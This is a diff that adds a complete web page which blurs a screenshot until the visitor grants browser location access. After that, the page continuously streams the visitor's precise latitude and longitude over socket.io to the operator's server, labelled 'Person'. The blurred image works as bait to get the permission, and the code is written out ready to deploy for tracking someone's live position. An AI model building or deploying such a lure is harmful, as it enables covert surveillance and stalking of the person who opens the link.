@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Location Sharing Active</title>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    /* --- Base Setup --- */
+    body {
+      margin: 0;
+      overflow: hidden; /* Prevents scrollbars */
+    }
+
+    /* --- Background Image and Blur Effect --- */
+    #background {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: -1;
+
+      /* Default (laptop) background */
+      background-image: url('https://assets.onecompiler.app/43haghwug/43kvzx6ub/Screenshot%202025-06-06%20004225.png');
+      background-size: cover;
+      background-position: center;
+      
+      /* Initial blurred state */
+      filter: blur(15px);
+
+      /* Smooth transition for the blur effect */
+      transition: filter 1.2s ease-in-out;
+    }
+
+    /* Rule to un-blur the background when tracking is active */
+    body.tracking-active #background {
+      filter: blur(0px);
+    }
+    
+    /* --- Media Query for Phone Screens --- */
+    @media (max-width: 768px) {
+      #background {
+        /* Use the phone background image */
+        background-image: url('https://assets.onecompiler.app/43haghwug/43kvzx6ub/Screenshot%202025-06-06%20004641.png');
+      }
+    }
+  </style>
+</head>
+<body onload="startTracking()">
+  
+  <div id="background"></div>
+
+  <script src="/socket.io/socket.io.js"></script>
+  <script>
+    const socket = io();
+
+    function startTracking() {
+      // 1. Check for Geolocation support
+      if (!navigator.geolocation) {
+        console.error("Geolocation is not supported by this browser.");
+        // The background will remain blurred as tracking can't start.
+        return;
+      }
+
+      // 2. Immediately start watching the position. This will trigger the browser's permission prompt.
+      navigator.geolocation.watchPosition(
+        // === SUCCESS CALLBACK ===
+        // This function only runs IF AND AFTER the user clicks "Allow".
+        (position) => {
+          // Un-blur the background on the first successful location read
+          if (!document.body.classList.contains('tracking-active')) {
+            document.body.classList.add('tracking-active');
+          }
+
+          const { latitude, longitude } = position.coords;
+          
+          if (socket.connected) {
+            // We use the unique socket.id as the identifier
+            const data = { 
+              id: "Person", // Use "Person" as the label as requested
+              lat: latitude, 
+              lon: longitude 
+            };
+            socket.emit('locationUpdate', data);
+          }
+        }, 
+        // === ERROR CALLBACK ===
+        // This function runs if the user clicks "Block" or an error occurs.
+        (error) => {
+          console.error(`Geolocation Error (${error.code}): ${error.message}`);
+          // The background remains blurred because permission was denied or failed.
+          // No further action is needed.
+        },
+        // Geolocation Options
+        { 
+          enableHighAccuracy: true, 
+          timeout: 10000, 
+          maximumAge: 0 
+        }
+      );
+    }
+  </script>
+</body>
+</html>
